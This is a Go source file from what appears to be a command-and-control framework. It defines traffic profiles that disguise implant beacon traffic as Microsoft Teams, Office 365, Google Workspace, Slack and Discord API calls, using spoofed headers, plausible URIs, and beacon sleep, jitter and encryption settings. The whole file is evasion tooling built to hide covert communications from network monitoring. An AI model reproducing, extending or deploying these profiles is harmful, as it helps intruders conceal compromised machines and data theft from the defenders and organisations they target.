package profiles

import (
	"time"
)

type Profile struct {
	Name        string            `json:"name"`
	Description string            `json:"description"`
	Protocol    string            `json:"protocol"`
	Headers     map[string]string `json:"headers"`
	URIs        []string          `json:"uris"`
	Sleep       int               `json:"sleep"`
	Jitter      float64           `json:"jitter"`
	MaxPostSize int               `json:"max_post_size"`
	Encryption  string            `json:"encryption"`
}

var DefaultProfiles = map[string]*Profile{
	"teams": {
		Name:        "Microsoft Teams",
		Description: "Mimics Microsoft Teams API traffic",
		Protocol:    "https",
		Headers: map[string]string{
			"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			"Content-Type":     "application/json",
			"X-Teams-Client":   "1.0",
			"X-Teams-Version":  "2024.1.1",
		},
		URIs:        []string{"/api/v1/messages", "/api/v1/channels", "/api/v1/files"},
		Sleep:       30,
		Jitter:      0.25,
		MaxPostSize: 1024 * 1024,
		Encryption:  "aes-256-gcm",
	},
	"office365": {
		Name:        "Office 365",
		Description: "Mimics Office 365 API traffic",
		Protocol:    "https",
		Headers: map[string]string{
			"User-Agent":      "Microsoft Office/16.0",
			"Content-Type":    "application/json",
			"Authorization":   "Bearer",
		},
		URIs:        []string{"/api/v2/me/messages", "/api/v2/drive/root"},
		Sleep:       60,
		Jitter:      0.5,
		MaxPostSize: 2 * 1024 * 1024,
		Encryption:  "aes-256-gcm",
	},
	"google": {
		Name:        "Google Workspace",
		Description: "Mimics Google Workspace API traffic",
		Protocol:    "https",
		Headers: map[string]string{
			"User-Agent":    "Google-API-JS-Client/1.0",
			"Content-Type":  "application/json",
			"X-Goog-Api-Key": "placeholder",
		},
		URIs:        []string{"/drive/v3/files", "/gmail/v1/messages"},
		Sleep:       45,
		Jitter:      0.3,
		MaxPostSize: 1024 * 1024,
		Encryption:  "aes-256-gcm",
	},
	"slack": {
		Name:        "Slack",
		Description: "Mimics Slack API traffic",
		Protocol:    "https",
		Headers: map[string]string{
			"User-Agent":    "Slack-Desktop/4.35",
			"Content-Type":  "application/json",
			"Authorization": "Bearer",
		},
		URIs:        []string{"/api/chat.postMessage", "/api/files.upload"},
		Sleep:       20,
		Jitter:      0.2,
		MaxPostSize: 512 * 1024,
		Encryption:  "aes-256-gcm",
	},
	"discord": {
		Name:        "Discord",
		Description: "Mimics Discord API traffic",
		Protocol:    "https",
		Headers: map[string]string{
			"User-Agent":    "Mozilla/5.0",
			"Content-Type":  "application/json",
			"Authorization": "Bot",
		},
		URIs:        []string{"/api/v9/channels", "/api/v9/guilds"},
		Sleep:       15,
		Jitter:      0.15,
		MaxPostSize: 512 * 1024,
		Encryption:  "aes-256-gcm",
	},
}

func GetProfile(name string) *Profile {
	profile, exists := DefaultProfiles[name]
	if !exists {
		return DefaultProfiles["teams"]
	}
	return profile
}

func ListProfiles() []string {
	profiles := make([]string, 0, len(DefaultProfiles))
	for name := range DefaultProfiles {
		profiles = append(profiles, name)
	}
	return profiles
}

func ValidateProfile(p *Profile) bool {
	if p.Name == "" {
		return false
	}
	if p.Protocol == "" {
		return false
	}
	if p.Sleep <= 0 {
		p.Sleep = 30
	}
	if p.Jitter <= 0 {
		p.Jitter = 0.25
	}
	return true
}

func GetSleepWithJitter(sleep int, jitter float64) time.Duration {
	baseSleep := time.Duration(sleep) * time.Second
	jitterAmount := time.Duration(float64(baseSleep) * jitter)
	return baseSleep + jitterAmount
}
